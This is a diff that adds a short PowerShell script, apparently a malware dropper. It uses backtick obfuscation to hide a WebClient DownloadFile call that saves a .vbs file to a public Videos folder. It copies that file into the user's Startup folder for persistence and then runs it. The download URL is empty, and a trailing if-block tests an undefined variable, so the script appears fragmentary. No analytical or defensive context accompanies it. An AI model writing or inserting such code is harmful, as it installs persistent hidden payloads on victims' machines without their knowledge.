@@ -1,0 +1,18 @@
+
+$p = "C:\Users\Public\Videos\etytytytytytytytytytytytytytytytyty.vbs"
+
+
+
+
+
+(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('', $p)
+
+Sleep -S 30
+Copy-Item "C:\Users\Public\Videos\etytytytytytytytytytytytytytytytyty.vbs" -Destination "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\c.vbs" 
+
+Start-Sleep -S 30
+Invoke-Item $p
+if($pa -eq $true)
+{
+
+}
